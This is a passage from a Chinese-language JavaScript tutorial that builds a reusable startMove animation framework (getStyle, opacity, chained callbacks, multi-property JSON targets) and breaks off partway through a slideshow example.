<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:200px; height:200px; background:red; border:1px solid black;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">setInterval(function ()&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.width=oDiv.offsetWidth-1+&apos;px&apos;;</span><br><span class="line">&#125;, 30);  // =202-1=201  =201+1+1+1</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>解决方案 用getStyle替换offset<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:200px; height:200px; background:red; border:1px solid black;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function getStyle(obj, name)  //获取不在行间的样式  </span><br><span class="line">&#123;</span><br><span class="line">	if(obj.currentStyle)</span><br><span class="line">	&#123;</span><br><span class="line">		return obj.currentStyle[name];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return getComputedStyle(obj, false)[name];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setInterval(function ()&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.width=parseInt(getStyle(oDiv, &apos;width&apos;))-1+&apos;px&apos;;</span><br><span class="line">&#125;, 30);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="去掉offset">去掉offset</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:yellow; border:10px solid black; font-size:14px;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv1=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv1.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;height&apos;, 400);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv1.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;height&apos;, 200);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv2.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;width&apos;, 400);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv2.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;width&apos;, 200);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	var oDiv3=document.getElementById(&apos;div3&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv3.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;fontSize&apos;, 50);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv3.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;fontSize&apos;, 14);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	var oDiv4=document.getElementById(&apos;div4&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv4.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;borderWidth&apos;, 100);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv4.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;borderWidth&apos;, 10);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function getStyle(obj, name)</span><br><span class="line">&#123;</span><br><span class="line">	if(obj.currentStyle)</span><br><span class="line">	&#123;</span><br><span class="line">		return obj.currentStyle[name];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return getComputedStyle(obj, false)[name];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function startMove(obj, attr, iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	clearInterval(obj.timer);</span><br><span class="line">	obj.timer=setInterval(function ()&#123;</span><br><span class="line">		var cur=parseInt(getStyle(obj, attr));</span><br><span class="line">		</span><br><span class="line">		var speed=(iTarget-cur)/6;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(cur==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(obj.timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			obj.style[attr]=cur+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;变高&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div2&quot;&gt;变宽&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div3&quot;&gt;字符变大&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div4&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="原有运动框架的问题">原有运动框架的问题</span></h3><ul>
<li>只能让某个值运动起来</li>
<li>如果想让其他值运动起来，要修改程序</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:yellow; border:10px solid black; filter:alpha(opacity:30); opacity:0.3;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv1=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv1.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;opacity&apos;, 100);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv1.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;opacity&apos;, 30);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function getStyle(obj, name)</span><br><span class="line">&#123;</span><br><span class="line">	if(obj.currentStyle)</span><br><span class="line">	&#123;</span><br><span class="line">		return obj.currentStyle[name];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return getComputedStyle(obj, false)[name];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function startMove(obj, attr, iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	clearInterval(obj.timer);</span><br><span class="line">	obj.timer=setInterval(function ()&#123;</span><br><span class="line">		var cur=parseInt(getStyle(obj, attr));</span><br><span class="line">		</span><br><span class="line">		var speed=(iTarget-cur)/6;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(cur==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(obj.timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			obj.style[attr]=cur+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="扩展的运动框架">扩展的运动框架</span></h3><ul>
<li>运动属性作为参数</li>
<li>封装opacity<br>小数的问题 Math.round() 四舍五入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">move.js</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:yellow; border:10px solid black; filter:alpha(opacity:30); opacity:0.3;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv1=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv1.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;opacity&apos;, 100);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv1.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, &apos;opacity&apos;, 30);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function getStyle(obj, name)</span><br><span class="line">&#123;</span><br><span class="line">	if(obj.currentStyle)</span><br><span class="line">	&#123;</span><br><span class="line">		return obj.currentStyle[name];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return getComputedStyle(obj, false)[name];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function startMove(obj, attr, iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	clearInterval(obj.timer);</span><br><span class="line">	obj.timer=setInterval(function ()&#123;</span><br><span class="line">		var cur=0;</span><br><span class="line">		</span><br><span class="line">		if(attr==&apos;opacity&apos;)</span><br><span class="line">		&#123;</span><br><span class="line">			cur=Math.round(parseFloat(getStyle(obj, attr))*100);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			cur=parseInt(getStyle(obj, attr));</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		var speed=(iTarget-cur)/6;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(cur==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(obj.timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			if(attr==&apos;opacity&apos;)</span><br><span class="line">			&#123;</span><br><span class="line">				obj.style.filter=&apos;alpha(opacity:&apos;+(cur+speed)+&apos;)&apos;;  //IE</span><br><span class="line">				obj.style.opacity=(cur+speed)/100;</span><br><span class="line">				// 火狐</span><br><span class="line">				document.getElementById(&apos;txt1&apos;).value=obj.style.opacity;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				obj.style[attr]=cur+speed+&apos;px&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;txt1&quot; /&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="js运动中级">JS运动中级</span></h1><h2><span id="链式运动框架">链式运动框架</span></h2><p>回调函数</p>
<ul>
<li>运动停止时，执行函数</li>
<li>运动停止时，开始下一次运动<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:100px; height:100px; background:red;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script src=&quot;move.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123; </span><br><span class="line">		startMove(oDiv, &apos;width&apos;, 300);  //先变宽</span><br><span class="line">		startMove(oDiv, &apos;height&apos;, 300);	//再变长</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;iinput id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;运动&quot; /&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="完美运动框架">完美运动框架</span></h2><h3><span id="多个值同时变化">多个值同时变化</span></h3><p>setStyle同时设置多个属性</p>
<p>-参数传递</p>
<ul>
<li>Json的使用，实现多个属性运动</li>
<li>for in遍历属性<br>-运用到运动框架</li>
<li>检测运动停止</li>
<li>标志变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">move2.js</span><br><span class="line"></span><br><span class="line">function getStyle(obj, name)</span><br><span class="line">&#123;</span><br><span class="line">	if(obj.currentStyle)</span><br><span class="line">	&#123;</span><br><span class="line">		return obj.currentStyle[name];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return getComputedStyle(obj, false)[name];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//startMove(oDiv, &#123;width: 400, height: 400&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function startMove(obj, json, fnEnd)</span><br><span class="line">&#123;</span><br><span class="line">	clearInterval(obj.timer);</span><br><span class="line">	obj.timer=setInterval(function ()&#123;</span><br><span class="line">		var bStop=true;		//假设：所有值都已经到了</span><br><span class="line">		</span><br><span class="line">		for(var attr in json)</span><br><span class="line">		&#123;</span><br><span class="line">			var cur=0;</span><br><span class="line">			</span><br><span class="line">			if(attr==&apos;opacity&apos;)</span><br><span class="line">			&#123;</span><br><span class="line">				cur=Math.round(parseFloat(getStyle(obj, attr))*100);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				cur=parseInt(getStyle(obj, attr));</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			var speed=(json[attr]-cur)/6;</span><br><span class="line">			speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">			</span><br><span class="line">			if(cur!=json[attr])</span><br><span class="line">				bStop=false;</span><br><span class="line">			</span><br><span class="line">			if(attr==&apos;opacity&apos;)</span><br><span class="line">			&#123;</span><br><span class="line">				obj.style.filter=&apos;alpha(opacity:&apos;+(cur+speed)+&apos;)&apos;;</span><br><span class="line">				obj.style.opacity=(cur+speed)/100;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				obj.style[attr]=cur+speed+&apos;px&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		if(bStop)    //运动完成，关闭定时器</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(obj.timer);</span><br><span class="line">						</span><br><span class="line">			if(fnEnd)fnEnd(); //在运动结束被调用</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="调用框架">调用框架</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:100px; height:100px; background:red; filter:alpha(opacity:30); opacity:0.3;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;move2.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(oDiv, &#123;width: 101, height: 300, opacity: 100&#125;, function ()&#123;</span><br><span class="line">			alert(&apos;a&apos;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;iinput id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;运动&quot; /&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="运动框架总结">运动框架总结</span></h2><p>运动框架演变过程</p>
<ul>
<li>startMove(iTarget)            运动框架</li>
<li>startMove(obj, iTarget)            多物体</li>
<li>startMove(obj, attr, iTarget)        任意值</li>
<li>startMove(obj, attr, iTarget, fn)        链式运动</li>
<li>startMove(obj, json)            多值运动</li>
<li>startMove(obj, json, fn)        完美运动框架</li>
</ul>
<h2><span id="运动框架应用">运动框架应用</span></h2><h3><span id="例子幻灯片">例子：幻灯片</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;play&apos;);</span><br><span class="line">	var aBtn=oDiv.getElementsByTagName(&apos;ol&apos;)[0].getElementsByTagName(&apos;li&apos;);</span><br><span class="line">	var oUl=oDiv.getElementsByTagName(&apos;ul&apos;)[0];</span><br><span class="line">	</span><br><span class="line">	var now=0;   //设置第一种的top值</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;aBtn.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aBtn[i].index=i;    //定义一个index来记录是第几张图</span><br><span class="line">		aBtn[i].onclick=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			now=this.index;         //now保存当前图片Id</span><br><span class="line">				</span><br><span class="line">			tab();					//调用tab函数</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function tab()      //改变top值，实现幻灯片效果</span><br><span class="line">	&#123;</span><br><span class="line">		for(var i=0;i&lt;aBtn.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			aBtn[i].className=&apos;&apos;;   </span><br><span class="line">		&#125;</span><br><span class="line">		aBtn[now].className=&apos;active&apos;;  //使当前的button置亮</span><br><span class="line">		startMove(oUl, &#123;top: -150*now&#125;);  //调用move.js框架</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function next()			//调用next函数进行自动切换</span><br><span class="line">	&#123;</span><br><span class="line">		now++; 			